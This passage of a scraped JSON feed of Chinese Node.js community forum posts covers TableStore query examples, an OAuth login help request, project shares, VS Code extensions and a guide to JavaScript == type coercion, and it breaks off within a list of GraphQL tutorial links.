x21</td>\n<td>vivo</td>\n<td>手机</td>\n<td>2018-07-17 21:00:00</td>\n<td></td>\n<td>否</td>\n<td>2498.99</td>\n<td>2</td>\n<td>4997.98</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>消费者编号（主键）</th>\n<th>消费者姓名</th>\n<th>消费者积分</th>\n<th>注册时间</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>c0001</td>\n<td>消赵一</td>\n<td>818</td>\n<td>2018-07-07 14:33:51</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>售货员编号（主键）</th>\n<th>售货员姓名</th>\n<th>售货员积分</th>\n<th>入职日期</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>s0001</td>\n<td>售赵一</td>\n<td>613</td>\n<td>2018-07-07 14:27:59</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>产品编号（主键）</th>\n<th>产品名</th>\n<th>产品品牌</th>\n<th>产品类型</th>\n<th>产品单价</th>\n<th>新增时间</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>p0001001</td>\n<td>iphone 6</td>\n<td>苹果</td>\n<td>手机</td>\n<td>6969.00</td>\n<td>2018-07-07 14:44:39</td>\n</tr>\n</tbody>\n</table>\n<h2>4、数据读取</h2>\n<p>数据读取分为两类：</p>\n<h3>主键读取</h3>\n<p>基于原生表格存储的主键列获取：getRow, getRange, batchGetRow等。主键读取用于索引（自动）反查，用户也可以提供主键（订单md5）的单条查询的页面，亿量级下查询速度极快。单主键查询方式不支持多维度检索；</p>\n<h3>索引读取</h3>\n<p>基于新SearchIndex功能Query：search接口。用户可以自由设计索引字段的多维度条件组合查询。通过设置选择不同的查询参数，构建不同的查询条件、不同排序方式；目前支持：精确查询、范围查询、前缀查询、匹配查询、通配符查询、短语匹配查询、分词字符串查询，并通过布尔与、或组合。\n如【c0001号消费者，且消费在99.99以上的订单】组合方式如下：</p>\n<h4>Node.js代码</h4>\n<pre class=\"prettyprint language-node\"><code>client.search({\n    tableName: TABLE_NAME,\n    indexName: INDEX_NAME,\n    searchQuery: {\n        offset: 0,\n        limit: 10, \n        query: {\n            queryType: TableStore.QueryType.BOOL_QUERY,\n            query: {\n                mustQueries: [ \n                    { &#x2F;&#x2F;查询条件一：TermQuery，cId这一列的值要匹配&quot;c0001&quot;\n                        queryType: TableStore.QueryType.TERM_QUERY,\n                        query: {\n                            fieldName: &quot;cId&quot;,\n                            term: &quot;c0001&quot;\n                        }\n                    },\n                    { &#x2F;&#x2F;查询条件二：RangeQuery，totalPrice这一列的值要大于99.99\n                        queryType: TableStore.QueryType.RANGE_QUERY,\n                        query: {\n                            fieldName: &quot;totalPrice&quot;,\n                            rangeFrom: 99.99,\n                        }\n                    },\n                ],\n            }\n        },\n        getTotalCount: true\n    },\n    columnToGet: {\n        returnType: TableStore.ColumnReturnType.RETURN_ALL\n    }\n}, callback);\n</code></pre><h4>Java代码</h4>\n<pre class=\"prettyprint language-java\"><code>List&lt;Query&gt; mustQueries = new ArrayList&lt;Query&gt;();\n\nTermQuery termQuery = new TermQuery();\ntermQuery.setFieldName(&quot;cId&quot;);\ntermQuery.setTerm(ColumnValue.fromString(&quot;c0001&quot;));\nmustQueries.add(termQuery);\n\nRangeQuery rangeQuery = new RangeQuery();\nrangeQuery.setFieldName(&quot;totalPrice&quot;);\nrangeQuery.setFrom(ColumnValue.fromDouble(99.99)）;\nmustQueries.add(rangeQuery);\n\nBoolQuery boolQuery = new BoolQuery();\nboolQuery.setMustQueries(mustQueries);\n</code></pre><h1>四、欢迎加入</h1>\n<p>__引自云栖：原文地址：<a href=\"https://yq.aliyun.com/articles/656196?channel=cnode\">https://yq.aliyun.com/articles/656196</a></p>\n<p>这样，系统的核心代码已经完成，基于表格存储搭建订单系统，是不是很简单？\n对表格存储（TableStore）感兴趣的用户，欢迎加入【表格存储公开交流群】，群号：11789671。</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1537322850354-4836eb95-39f4-4f76-ba4c-03aff0735a23.png\" alt=\"image.png | left | 409x527\" title=\"image.png | left | 409x527\"></p>\n</div>","title":"TableStore实战：亿量级订单管理解决方案","last_reply_at":"2019-03-11T12:43:06.396Z","good":false,"top":false,"reply_count":8,"visit_count":1382,"create_at":"2019-01-09T13:53:33.212Z","author":{"loginname":"wangtantan","avatar_url":"https://avatars1.githubusercontent.com/u/16631445?v=4&s=120"}},{"id":"5b03bb29000332b81cf821a1","author_id":"5acdfae7464b1bfa6b425058","tab":"ask","content":"<div class=\"markdown-text\"><p>才开始学习使用nodejs，接到一个做第三方的需求</p>\n<p>参照：<a href=\"https://github.com/iamshaunjp/oauth-playlist/tree/lesson-10\">https://github.com/iamshaunjp/oauth-playlist/tree/lesson-10</a>\n进行的实现，相应的clientid，clientsecret已经换成自己的了，但是一跑起来就报这个错\n国内用的shadowsocks翻的墙\n1.google了很久，都没得到解决，有几个方案认为是http代理的问题，提的pac这类的，这个不懂，希望有人能帮助解答一下。\n2.目前网站是http的协议，后面测试facebook要强制https，这个也没解决</p>\n</div>","title":"现金酬谢！！！紧急求助  用passport.js 实现第三方登录时遇到：InternalOAuthError: Failed to obtain access token","last_reply_at":"2019-03-11T11:23:03.863Z","good":false,"top":false,"reply_count":3,"visit_count":1398,"create_at":"2018-05-22T06:39:37.425Z","author":{"loginname":"ZiNai","avatar_url":"https://avatars1.githubusercontent.com/u/18731079?v=4&s=120"}},{"id":"5c7fe1ae5b8cb21491ca6a5c","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"http://ripple.bengbuzhangyue.xyz/\">http://ripple.bengbuzhangyue.xyz/</a></p>\n<p>喜欢的点个star吧</p>\n<p><a href=\"https://github.com/BengBu-YueZhang/ripple\">https://github.com/BengBu-YueZhang/ripple</a></p>\n</div>","title":"Ripple","last_reply_at":"2019-03-11T08:14:38.871Z","good":false,"top":false,"reply_count":1,"visit_count":526,"create_at":"2019-03-06T15:05:18.058Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5c85f3f47ce0df3732426d45","author_id":"5bf779d3be1b120abac5c27c","tab":"share","content":"<div class=\"markdown-text\"><h2>项目介绍  <a href=\"https://github.com/zhangfan6644777/taro-cnode\">项目链接</a></h2>\n<p>基于taro taro-ui构建的项目，目前兼容h5和微信小程序，样式自己设计，接口和数据来自于<a href=\"https://cnodejs.org/api\">cnode社区</a></p>\n<pre class=\"prettyprint language- bash\"><code># 克隆项目\ngit clone https:&#x2F;&#x2F;github.com&#x2F;zhangfan6644777&#x2F;taro-cnode.git\n  \n# 安装依赖，或 npm i\nyarn\n\n# 运行小程序（微信 weapp）\nnpm run dev:weapp\n\n# 运行 H5\nnpm run dev:h5\n\n</code></pre><h2>功能</h2>\n<pre class=\"prettyprint\"><code>  1.登录功能\n  2.列表分页，滚动底部加载更多\n  3.发帖，回复帖子\n  4.查看消息\n  5.个人中心\n</code></pre><h2>整体思路</h2>\n<p>1.在taro里面引入Redux，就是每个页面对应一个actions,constants,reducers,services,store,\n主要由视图触发action 然后action 去dispatch对应页面的reducer，最后返回新的数据给对应的页面</p>\n<ul>\n<li><code>Index</code>主要是主页的列表信息,滚动底部加载更多</li>\n<li><code>ArticleDetails</code>对应文章内容页面详情,评论</li>\n<li><code>Publish</code>对应发布文章页面,默认是发布测试类型</li>\n<li><code>Message</code>对应账号的消息页面,包括已读消息和未读消息</li>\n<li><code>Center</code>对应账号的登录信息</li>\n<li><code>Mytopic</code>个人参与的文章，回复的文章</li>\n</ul>\n<p>2.先做小程序，然后再去兼容H5，因为taro本来是以小程序为重心，再去兼容多端。</p>\n<p>3.使用了taro-ui和taro原组件库混用的方式,自己去写更少的样式，在开发中达到更高的效率。如果是公司项目 对UI要求的比较严格，请使用taro原组件，然后自己去写样式</p>\n<p>4.由于详情页面和评论返回的都是字符串html，这边针对h5和小程序分别使用了不用的处理方式，小程序自己将<a href=\"https://github.com/icindy/wxParse\">wxPrase</a>封装成taro组件<a href=\"https://github.com/zhangfan6644777/taro-cnode/tree/master/src/components/taro-wemark\">taro组件</a>，如下</p>\n<pre class=\"prettyprint\"><code>{process.env.TARO_ENV === &#x27;weapp&#x27; ? &lt;wemark desc={content}&#x2F;&gt; : &#x27;&#x27;}\n{process.env.TARO_ENV === &#x27;h5&#x27; ? &lt;View dangerouslySetInnerHTML={{ __html: content }} &#x2F;&gt; : &#x27;&#x27;}\n\n</code></pre><p>5.在开发中的一些<a href=\"https://nervjs.github.io/taro/docs/before-dev-remind.html\">注意点</a></p>\n<h2>其他说明</h2>\n<p>本项目代码没有做过多封装，方便阅读，如果有什么问题，可以提issue。</p>\n<h2>学习资源</h2>\n<p><a href=\"https://taro.aotu.io/\">taro</a>\n<a href=\"https://taro-ui.aotu.io\">taro-ui</a>\n<a href=\"https://react.docschina.org/\">react</a>\n<a href=\"https://www.redux.org.cn/\">redux</a>\n<a href=\"https://juejin.im/post/5c6a151f518825625e4ac830/\">jsNewbee</a></p>\n</div>","title":"用taro写的cnode社区   求关注","last_reply_at":"2019-03-11T05:43:20.417Z","good":false,"top":false,"reply_count":1,"visit_count":421,"create_at":"2019-03-11T05:36:52.243Z","author":{"loginname":"zhangfan6989888","avatar_url":"https://avatars2.githubusercontent.com/u/45278511?v=4&s=120"}},{"id":"5c8398967ce0df3732426735","author_id":"5c839611acb681372d41682d","tab":"ask","content":"<div class=\"markdown-text\"><p>论坛的各位,你好!我现在刚开始学习node.js,但是有一个问题我似乎想不明白,为什么市面上的视频教程教的数据库都是mongodb,为什么不用mysql,如果说是因为mogodb的格式直接就是json,方便js调用,学习成本低,但是由于mysql在国内使用上比较多,一些难点问题解决了很多,在一定的条件下降低了难度,如果说mongodb有mongoose,那mysql也有orm(sequelize),所以问题就是这样???</p>\n</div>","title":"关于选择数据库的问题","last_reply_at":"2019-03-11T03:52:09.907Z","good":false,"top":false,"reply_count":4,"visit_count":625,"create_at":"2019-03-09T10:42:30.952Z","author":{"loginname":"Arc-zlz","avatar_url":"https://avatars1.githubusercontent.com/u/26889461?v=4&s=120"}},{"id":"5c85db017ce0df3732426cd5","author_id":"5909444b782dbc4b183ecfe2","tab":"share","content":"<div class=\"markdown-text\"><p>大多数时候, 写的一个小小的库，还得要专门写变更日志。</p>\n<p>而遵循一定的 commit 格式，是可以生成标准的变更日志的。</p>\n<p>这时候就需要像<a href=\"https://github.com/conventional-changelog/conventional-changelog\">conventional-changelog</a></p>\n<p>这我就不得不在我的项目中添加脚本</p>\n<pre class=\"prettyprint language-bash\"><code>npx conventional-changelog-cli -p angular -i CHANGELOG.md -s -r 0\n</code></pre><p>今天呢，就把它提取出来，独立成为一个 vscode 扩展</p>\n<p>让你方便的生成 CHANGELOG</p>\n<h3>支持哪些特性</h3>\n<ul>\n<li>从头开始生成更改日志。</li>\n<li>从最近 1 个版本生成更改日志。</li>\n<li>从最近 2 个版本生成更改日志。</li>\n<li>从最近的 N 版本生成更改日志。</li>\n<li>自动生成<code>CHANGELOG.md</code>。</li>\n<li>将此版本更改附加到<code>CHANGELOG.md</code>。</li>\n</ul>\n<p><img src=\"https://github.com/axetroy/vscode-changelog-generator/raw/master/screenshot.gif\" alt=\"Screenshot\"></p>\n<h3>TODO</h3>\n<ul>\n<li>完整迁移<code>conventional-changelog-cli</code>的参数设置</li>\n<li>适配多个项目集合，类似<code>lerna</code></li>\n<li>在文件管理器添加<code>生成更新日志</code>菜单</li>\n</ul>\n<h3>说说踩的坑</h3>\n<p><code>conventional-changelog</code>的包分有</p>\n<ul>\n<li>conventional-changelog-cli</li>\n<li>conventional-changelog</li>\n<li>conventional-changelog-core</li>\n</ul>\n<p>按理来说，代码更次的，应该引用<code>conventional-changelog-core</code>或<code>conventional-changelog</code></p>\n<p>然而，这两个包都有问题: <strong>不能指定当前工作目录去解析</strong> (其实它引用的<code>git-raw-commits</code>是有参数设置的<code>conventional-changelog</code>并没有用这个参数)</p>\n<p>我又不想 Fork 一个自己改, 那就只能用 <code>conventional-changelog-cli</code>, 以命令行的方式去运行。</p>\n<h4>那么问题来了：</h4>\n<ol>\n<li>vscode 的扩展安装不是通过<code>npm install</code>的</li>\n</ol>\n<p>vscode 直接把本地的<code>node_modules</code>依赖打包，并且忽略了一些目录和文件，包括<code>.bin</code>目录</p>\n<p>所以扩展是找不到<code>conventional-changelog-cli</code>的可执行文件</p>\n<ol>\n<li>平台不同，可执行文件也不同</li>\n</ol>\n<p>Linux 和 OSX 下 是一个 link，自己执行 <code>chmod +x</code> 即可，而 windows 下是 exe 文件。</p>\n<p>所以自制可执行文件不靠谱</p>\n<h4>解决办法:</h4>\n<ol>\n<li>我不要可执行文件了，直接用 node 执行 js 文件可不可以</li>\n</ol>\n<pre class=\"prettyprint language-bash\"><code>node .&#x2F;node_modules&#x2F;conventional-changelog-cli&#x2F;cli.js\n</code></pre><p>可以是可以，不过这样的扩展就有局限行，需要用户安装<code>nodejs</code>，显然不是每个用户都安装</p>\n<ol>\n<li>使用 Electron 内置的 NodeJS 执行</li>\n</ol>\n<p>Electron 内置有的 NodeJS，我们就用它来执行这个 js 文件</p>\n<p><code>process.execPath</code>则是当前运行环境的可执行文件路径</p>\n<pre class=\"prettyprint language-javascript\"><code>execa(process.execPath, &#x27;.&#x2F;node_modules&#x2F;conventional-changelog-cli&#x2F;cli.js&#x27;);\n</code></pre><p>最后完美解决</p>\n<p>最后上项目: <a href=\"https://github.com/axetroy/vscode-changelog-generator\">https://github.com/axetroy/vscode-changelog-generator</a></p>\n<p>有什么意见或者功能需求，欢迎发issue给我!</p>\n</div>","title":"又一个vscode扩展，生成CHANGELOG","last_reply_at":"2019-03-11T03:50:25.595Z","good":false,"top":false,"reply_count":0,"visit_count":449,"create_at":"2019-03-11T03:50:25.595Z","author":{"loginname":"axetroy","avatar_url":"https://avatars2.githubusercontent.com/u/9758711?v=4&s=120"}},{"id":"5c823b8c7ce0df3732426448","author_id":"5909444b782dbc4b183ecfe2","tab":"share","content":"<div class=\"markdown-text\"><p>每次需要使用忽略 <code>eslint</code>/<code>tslint</code> 错误的时候，老是记不住，基本都要翻文档，很烦。</p>\n<p>哪里有不爽，哪里就有需求!</p>\n<p>所以干脆写那么一个扩展，来帮助我自动补全，岂不美哉!</p>\n<p><img src=\"https://github.com/axetroy/vscode-comment-autocomplete/raw/master/screenshot.gif\" alt=\"ts\"></p>\n<p>既然这样了，索性做做成一个通用的，集成比如 <code>prettier/webpack/jshint/TODO/FIXME</code>等类似的自动补全。</p>\n<p>支持语言: 绝大多数语言</p>\n<p>支持的工具提示: <code>eslint</code>/<code>tslint</code>/<code>prettier</code>/<code>typescript</code>/<code>webpack</code></p>\n<p>后续会支持更多语言和工具。</p>\n<p>如果有什么建议，欢迎反馈!</p>\n<p>最后上地址: <a href=\"https://github.com/axetroy/vscode-comment-autocomplete\">https://github.com/axetroy/vscode-comment-autocomplete</a></p>\n<p>ps:</p>\n<p>遵循着这个规范: <a href=\"https://www.python.org/dev/peps/pep-0350/\">https://www.python.org/dev/peps/pep-0350/</a></p>\n</div>","title":"老是记不住 eslint-disable-next-line 怎么办? 于是我写了个自动补全的扩展","last_reply_at":"2019-03-11T02:16:24.965Z","good":false,"top":false,"reply_count":9,"visit_count":555,"create_at":"2019-03-08T09:53:16.806Z","author":{"loginname":"axetroy","avatar_url":"https://avatars2.githubusercontent.com/u/9758711?v=4&s=120"}},{"id":"5c84f74aacb681372d416b2f","author_id":"5c381e903898674067a7e050","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FoVpkvGtd9qlR-5xgndPARJzDWUI\" alt=\"image.png\"></p>\n<p><img src=\"//static.cnodejs.org/FnupfxbISJxM4bD4940sJVBRdX0H\" alt=\"image.png\"></p>\n<p>如果喜欢就请给个start\ngithub地址：<a href=\"https://github.com/dezhizhang/egg.js\">https://github.com/dezhizhang/egg.js</a></p>\n</div>","title":"基于egg.js写的大型网站前后台","last_reply_at":"2019-03-11T02:09:03.943Z","good":false,"top":false,"reply_count":2,"visit_count":841,"create_at":"2019-03-10T11:38:50.954Z","author":{"loginname":"dezhizhang","avatar_url":"https://avatars3.githubusercontent.com/u/28954583?v=4&s=120"}},{"id":"5c853b7dacb681372d416bee","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><h1>图解 == 操作符规则和不同类型间转换规则</h1>\n<p>很多人包括我在内很抵触这种问题😡，因为很长一段时间我一直弄不明白 == 和 === 到底是怎么个规则。如果你也没闹明白 == 和 ===，读了这篇文章应该至少不会见到这俩操作符就觉得恶心了吧🤢。</p>\n<blockquote>\n<p>另外需要注意的是，== 的英文名叫 Abstract Equality Comparison；=== 则是 Strict Equality Comparison。</p>\n</blockquote>\n<p>废话不多说，我们开始搞起</p>\n<h2>== 操作符</h2>\n<h3>== 操作符基本规则</h3>\n<p>首先需要注意的是</p>\n<ul>\n<li>如果要比较的两个项是同种类型的，那么 == 就会返回 === 操作符的执行结果。举个例子🌰 <code>2 == 3</code> 最后会返回 <code>2 === 3</code> 的执行结果</li>\n<li>如果要比较的两个项是不同类型的，== 就会对其中一个或两者都进行类型转换然后再比较。比如 <code>2 == '3'</code> 就会变成 <code>2 == 3</code> 最后会比较 <code>2 === 3</code></li>\n</ul>\n<p>这就是最基本的规则</p>\n<h3>== 操作符具体的转化规则</h3>\n<p>然后我们再来看看具体的转换规则⬇️：</p>\n<h3>整体流程概览</h3>\n<ol>\n<li>如果类型相同，调用 <code>===</code> 操作符</li>\n<li>如果类型不同，尝试类型转换</li>\n</ol>\n<ul>\n<li>\n<ol>\n<li>查看是否是 <code>undefined</code> 和 <code>null</code> 比较</li>\n</ol>\n<ul>\n<li>✅ 返回 <code>true</code></li>\n<li>⬇️ 如果不是继续下一条规则</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>是否在比较 <code>string</code> 和 <code>number</code></li>\n</ol>\n<ul>\n<li>✅ 如果是，那么将 <code>string</code> 转为 <code>number</code> 并回到最初重新比较 ♻️</li>\n<li>⬇️ 如果不是继续下一条规则</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>查看我们比较的项中是否有 <code>boolean</code></li>\n</ol>\n<ul>\n<li>✅ 如果有，那么将 <code>boolean</code> 转为 <code>number</code> 并回到最初重新比较 ♻️</li>\n<li>⬇️ 如果不是继续下一条规则</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>查看是否有一项是 <code>object</code></li>\n</ol>\n<ul>\n<li>✅ 如果有，那么将 <code>object</code> 转为其原始值 <code>primitive</code> 并回到最初重新比较 ♻️</li>\n<li>❌ 如果还不是，只能返回 <code>false</code> 了💩</li>\n</ul>\n</li>\n</ul>\n<p>举几个🌰：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbbc914b21?w=1556&amp;h=392&amp;f=png&amp;s=164631\" alt=\"20190310173625.png\"></p>\n<p>这么看来转换规则是不是很清晰明了😳</p>\n<p>附上一张转换规则图，忘记了就看看，当然正常情况下应该用 === 代替 == 避免不必要的麻烦：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbbe7e06c5?w=2588&amp;h=1446&amp;f=png&amp;s=226352\" alt=\"20190311001056.png\"></p>\n<blockquote>\n<p>ecma 的规范：<a href=\"http://www.ecma-international.org/ecma-262/6.0/#sec-abstract-equality-comparison\">http://www.ecma-international.org/ecma-262/6.0/#sec-abstract-equality-comparison</a></p>\n</blockquote>\n<h2>类型转换</h2>\n<p>上述在比较的过程中，涉及到类型的转换，如字符串转整数、布尔值转整数、以及获取对象原始值等等。了解一下这些不同类型之间是如何转换的：</p>\n<h3>获取对象原始值</h3>\n<p>接着我们再来研究一下对象怎么转换为原始值的：</p>\n<blockquote>\n<p>我们需要知道转换类型的这个方法在 JS 源代码中是 <code>ToPrimitive</code> 这个方法，该方法有一个可选参数 <code>PreferredType</code>，这个参数的作用是指定期望类型；如果第一个参数对应的对象可以被转换为不止一种类型，那么后者可以作为一种暗示，表示该对象应该转换为那种类型</p>\n</blockquote>\n<ul>\n<li>\n<ol>\n<li>默认情况下（期望类型默认为 <code>number</code>）</li>\n</ol>\n<ul>\n<li>\n<ol>\n<li>调用 <code>valueOf</code> 方法：</li>\n</ol>\n<ul>\n<li>✅ 如果返回的是原始值，那么就用这个</li>\n<li>⬇️ 如果返回的不是原始值，那么跳到下一步</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>调用 <code>toString</code> 方法：</li>\n</ol>\n<ul>\n<li>✅ 如果返回的是原始值，那么就用这个</li>\n<li>❌ 否则报错💩</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>如果期望类型为 <code>string</code>：</li>\n</ol>\n<ul>\n<li>\n<ol>\n<li>调用 <code>toString</code> 方法：</li>\n</ol>\n<ul>\n<li>✅ 如果返回的是原始值，那么就用这个</li>\n<li>⬇️ 如果返回的不是原始值，那么跳到下一步</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>调用 <code>valueOf</code> 方法：</li>\n</ol>\n<ul>\n<li>✅ 如果返回的是原始值，那么就用这个</li>\n<li>❌ 否则报错💩</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>如果对象是 Date 类型（期望类型为 <code>string</code>）：</li>\n</ol>\n<ul>\n<li>\n<ol>\n<li>调用 <code>toString</code> 方法：</li>\n</ol>\n<ul>\n<li>✅ 如果返回的是原始值，那么就用这个</li>\n<li>⬇️ 如果返回的不是原始值，那么跳到下一步</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>调用 <code>valueOf</code> 方法：</li>\n</ol>\n<ul>\n<li>✅ 如果返回的是原始值，那么就用这个</li>\n<li>❌ 否则报错💩</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>简单的说就是默认调用 <code>valueOf</code> 方法，然后是 <code>toString</code> 方法；如果对象是 <code>Date</code> 类型或对象的期望类型为 <code>string</code>，那么先调用 <code>toString</code> 方法😪</p>\n<p>举几个🌰🌰🌰吧：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbbe8f1d08?w=912&amp;h=238&amp;f=png&amp;s=61887\" alt=\"20190310181039.png\"></p>\n<p>普通的对象，首先调用 valueOf 方法，返回的结果并非原始值，那么会调用 toString 方法</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbbeca788e?w=1318&amp;h=240&amp;f=png&amp;s=86596\" alt=\"20190310181441.png\"></p>\n<p>假设我们重写 valueOf 方法，valueOf 和 toString 同时返回 string 原始值。使用 == 操作符可以看出，对象还是优先使用了 valueOf 方法返回的值</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbbfda991c?w=1318&amp;h=240&amp;f=png&amp;s=86596\" alt=\"20190310181837.png\"></p>\n<p>上面的数组同理，首先默认调用 valueOf 方法，如不是原始值，则调用 toString 方法</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbbfbeb22e?w=1352&amp;h=200&amp;f=png&amp;s=68085\" alt=\"20190310182219.png\"></p>\n<p>这个包括众多类型的项的数组也是一样🐽</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbfab44044?w=1612&amp;h=174&amp;f=png&amp;s=85435\" alt=\"20190310182751.png\"></p>\n<p>再看看 Date 类型，他的期望类型是 string 因此首先调用的是 toString 方法，该方法返回一个原始值，那么就是用这个原始值</p>\n<h3>转换为 number</h3>\n<p>下面我们来看看转换成 number 类型的规则：</p>\n<ol>\n<li><code>undefined</code> 👉 <code>NaN</code> 如果是 undefined 则直接转换成 NaN</li>\n<li><code>null</code> 👉 <code>0</code> 如果是 null 则转换成 0</li>\n<li><code>boolean</code> 👉 <code>0/1</code> 如果是 boolean 则转换成 0 或 1</li>\n<li><code>string</code> 👉 <code>0/NaN/(parse to number)</code> 如果是 string 则转换成对应的 number，空字符串转换为 0，无法转换的则为 NaN</li>\n<li><code>object</code> 👉 首先获取原始值然后再转为 number</li>\n</ol>\n<p>看几个🌰：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbfaaa9034?w=1308&amp;h=562&amp;f=png&amp;s=172004\" alt=\"20190310233718.png\"></p>\n<h3>转换为 string</h3>\n<p>转为 string 的规则为：</p>\n<ol>\n<li><code>undefined</code> 👉 <code>'undefined'</code></li>\n<li><code>null</code> 👉 <code>'null'</code></li>\n<li><code>number</code> 👉 <code>'number</code></li>\n<li><code>boolean</code> 👉 <code>'true'/'false'</code></li>\n<li><code>object</code> 👉 首先获取原始值，然后转为 string</li>\n</ol>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbfde85a36?w=1328&amp;h=426&amp;f=png&amp;s=143279\" alt=\"20190310234912.png\"></p>\n<h3>转为 boolean</h3>\n<p>常见的问题：哪些是 falsy 哪些是 truthy：</p>\n<p>❌下面这些在 JS 中都为 falsy 除此之外的都是 truthy</p>\n<ol>\n<li><code>undefined</code> 👉 falsy</li>\n<li><code>null</code> 👉 falsy</li>\n<li><code>0</code> 👉 falsy</li>\n<li><code>&quot;&quot;</code> 👉 falsy</li>\n<li><code>NaN</code> 👉 falsy</li>\n</ol>\n<p>因此转换规则如下：</p>\n<ol>\n<li><code>undefined</code> 👉 <code>false</code></li>\n<li><code>null</code> 👉 <code>false</code></li>\n<li><code>number</code> 👉 当为 0 时 <code>false</code> 否则为 <code>true</code></li>\n<li><code>string</code> 👉 当为空字符串时为 <code>false</code> 否则为 <code>true</code></li>\n<li><code>object</code> 👉 <code>true</code></li>\n<li><code>array</code> 👉 <code>true</code></li>\n<li><code>Date</code> 👉 <code>true</code></li>\n</ol>\n<p>🦐🍜是几个例子：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dbffa6fc14?w=1222&amp;h=546&amp;f=png&amp;s=144660\" alt=\"20190311000041.png\"></p>\n<p>附上一张不同类型间转换规则：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/169686dc004effe2?w=605&amp;h=514&amp;f=png&amp;s=54783\" alt=\"20190311001627.png\"></p>\n<p>就写到这里，基本上 == 和类型转换就是这个样子❕</p>\n<p><strong>EOF</strong></p>\n<p>参考：</p>\n<ul>\n<li><a href=\"http://www.cnblogs.com/178mz/p/5083228.html?utm_medium=referral\">http://www.cnblogs.com/178mz/p/5083228.html?utm_medium=referral</a></li>\n<li><a href=\"http://www.ecma-international.org/ecma-262/6.0/#sec-abstract-equality-comparison\">http://www.ecma-international.org/ecma-262/6.0/#sec-abstract-equality-comparison</a></li>\n<li><a href=\"https://www.codementor.io/javascript/tutorial/double-equals-and-coercion-in-javascript\">https://www.codementor.io/javascript/tutorial/double-equals-and-coercion-in-javascript</a></li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/1695629d1afe5a0e?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt></p>\n</div>","title":"🍒 图解 == 操作符规则和不同类型间转换规则","last_reply_at":"2019-03-10T16:29:49.757Z","good":false,"top":false,"reply_count":0,"visit_count":563,"create_at":"2019-03-10T16:29:49.757Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c8376d27ce0df37324266b4","author_id":"58400cd63aa1310a5786878f","tab":"share","content":"<div class=\"markdown-text\"><h2>诱人的 GraphQL 视频教程（34 个视频）</h2>\n<p><a href=\"https://www.rails365.net/movies/graphql/414.html\">诱人的 GraphQL 视频教程 #1 介绍</a>「06:59」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/415.html\">诱人的 GraphQL 视频教程 #2 搭建 Express 项目框架</a>「05:40」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/461.html\">诱人的 GraphQL 视频教程 #3 搭建  GraphQL 项目框架</a>「04:06」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/462.html\">诱人的 GraphQL 视频教程 #4 创建第一个 GraphQL Schema</a>「04:26」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/463.html\">诱人的 GraphQL 视频教程 #5 Root Query</a>「Pro」「04:24」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/464.html\">诱人的 GraphQL 视频教程 #6 Resolve Function</a>「Pro」「05:18」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/465.html\">诱人的 GraphQL 视频教程 #7 在 Graphiql 中测试查询</a>「Pro」「05:46」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/466.html\">诱人的 GraphQL 视频教程 #8 酷炫的本地测试软件 graphql-playground</a>「Pro」「03:49」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/467.html\">诱人的 GraphQL 视频教程 #9 GraphQLID</a>「Pro」「03:11」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/468.html\">诱人的 GraphQL 视频教程 #10 Author Type 和 GraphQLInt</a>「Pro」「05:11」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/469.html\">诱人的 GraphQL 视频教程 #11 关联关系</a>「Pro」「07:53」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/470.html\">诱人的 GraphQL 视频教程 #12 GraphQLList</a>「Pro」「05:30」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/471.html\">诱人的 GraphQL 视频教程 #13 返回 GraphQL 列表</a>「Pro」「04:27」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/472.html\">诱人的 GraphQL 视频教程 #14 连接到 mLab 线上的 MongoDB 数据库</a>「Pro」「07:04」</p>\n<p><a 